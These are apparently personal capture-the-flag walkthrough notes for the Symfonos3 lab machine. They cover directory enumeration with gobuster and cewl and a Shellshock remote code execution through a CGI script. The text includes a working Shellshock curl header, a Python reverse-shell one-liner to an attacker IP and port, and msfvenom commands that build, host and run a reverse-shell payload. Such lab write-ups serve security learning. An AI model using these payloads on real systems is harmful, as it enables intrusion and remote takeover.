# Port 80 HTTP - Apache 2.4.25

```
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php,py,txt -u http://10.1.62.38
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/cgi-bin/.php (Status: 403)
/gate (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
```

Methods supported: HEAD GET POST OPTIONS

Gobuster scan with unicode wordlist yielded this:
/%2e%2e (Status: 200) (.. which might makw the site go to previous dir)

Generated wordlist

>λ cewl -d 1 -w cewl_wordlist.txt --lowercase http://10.1.62.38/gate/cerberos/tartarus/research

Revealed
/acheron (Status: 301)
/charon (Status: 301)
/cocytus (Status: 301)
/phlegethon (Status: 301)
/hermes (Status: 301)
/hecatoncheires (Status: 301)

## Directories

```
gate
cerberus
tartarus
hermes
research

Structure:
gate/cerberus/tartarus/hermes
gate/cerberus/tartarus/research
gate/cerberus/tartarus/charon
```

*index.phps* found inside *hermes* dir

The research documents to *phlegethon* being "The river of fire, possibly leading to the depths of Tartarus." Possible WAP?

It was all a trick, the *underworld* file is inside *cgi-bin*, I have been fooled.

Is seems to be running the *uptime* command. Lets fuzz for URL parameters. 

![underworld](img/underworld_dir.png)


## CGI-BIN RCE

We can inject a command through the CGI-BIN request to *underworld*:

```
disastrpc symfonos3 λ curl -v http://10.1.62.38/cgi-bin/underworld -H "head:() { ignored; }; echo Content-Type: text/html; echo; /usr/bin/id"
*   Trying 10.1.62.38:80...
* Connected to 10.1.62.38 (10.1.62.38) port 80 (#0)
> GET /cgi-bin/underworld HTTP/1.1
> Host: 10.1.62.38
> User-Agent: curl/7.72.0
> Accept: */*
> head:() { ignored; }; echo Content-Type: text/html; echo; /usr/bin/id
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sun, 15 Nov 2020 14:08:47 GMT
< Server: Apache/2.4.25 (Debian)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html
< 
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
* Connection #0 to host 10.1.62.38 left intact
```

/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.1.62.33\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

CGI-ROOT: /usr/lib/cgi-bin

## Commands ran for exploit

Generate payload
>$ msfvenom -p linux/x64/shell_reverse_tcp LHOST-10.1.62.33 LPORT=4242 -e x86/shikata_ga_nai -f elf > rev4242

Host payload
>$ sudo python3 -m http.server 80

Download into target
>curl -v http://10.1.62.38/cgi-bin/underworld -H "head:() { ignored; }; echo Content-Type: text/html; echo; /tmp/rev4242"

Continues in general notes...